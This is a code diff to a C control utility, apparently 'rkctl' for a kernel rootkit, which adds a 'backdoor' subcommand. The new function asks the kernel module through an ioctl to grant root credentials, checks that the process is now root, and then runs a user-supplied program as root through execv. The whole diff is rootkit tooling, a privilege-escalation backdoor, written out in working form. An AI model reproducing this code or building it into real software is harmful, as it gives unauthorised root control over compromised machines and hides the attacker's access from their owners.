@@ -110,6 +110,32 @@ err:
     return -1;
 }
 
+int do_backdoor(int argc, const char *argv[]) {
+
+    const char *cmd;
+
+    if (argc < 3) {
+        printf("[-] rkctl: missing command for execv\n");
+        return -1;
+    }
+
+    /*
+     * Request root credentials
+     */
+    if (0 != do_ioctl_request("backdoor", RKCTL_BACKDOOR, NULL) || getuid() != 0) {
+        printf("[-] rkctl: privilege escalation failed\n");
+        return -1;
+    }
+
+    /*
+     * Execute command as root, if available
+     */
+    cmd = argv[2];
+    execv(cmd, NULL);
+
+    return 0;
+}
+
 int main(int argc, const char *argv[]) {
 
     char *endptr = NULL;
@@ -132,6 +158,10 @@ int main(int argc, const char *argv[]) {
     } else if (!strcmp(cmd, "unload")) {
 
         return do_ioctl_request("unload", RKCTL_UNLOAD, NULL);
+
+    } else if (!strcmp(cmd, "backdoor")) {
+
+        return do_backdoor(argc, argv);
 
     } else {
         printf("[-] rkctl: command not supported\n");
